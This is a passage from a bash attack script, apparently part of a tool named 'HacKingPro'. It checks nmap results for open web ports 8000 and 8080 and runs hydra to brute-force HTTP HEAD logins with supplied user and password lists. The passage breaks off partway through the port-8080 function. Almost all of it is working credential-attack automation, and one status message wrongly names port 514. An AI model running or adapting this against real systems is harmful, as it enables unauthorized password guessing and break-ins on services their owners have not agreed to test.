  BruteIRC

  #  Port 8000 (HTTP HEAD)
  BruteHTTP8000(){
    if grep -q 8000/tcp ${targetNAME}-HacKingPro-nmap.log ; then
      echo "        ${BBlue}|â”€â”€[${BRed} ğŸ¯ ${BBlue}]â”€â”€â•¼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
      Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|â”€â”€[${BRed} âŒ ${BBlue}]â”€â”€â•¼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
    fi
  }
  BruteHTTP8000

  #  Port 8080 (HTTP HEAD)
  BruteHTTP8080(){
    if grep -q 8080/tcp ${targetNAME}-HacKingPro-nmap.log ; then
      echo "        ${BBlue}|â”€â”€[${BRed} ğŸ¯ ${BBlue}]â”€â”€â•¼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
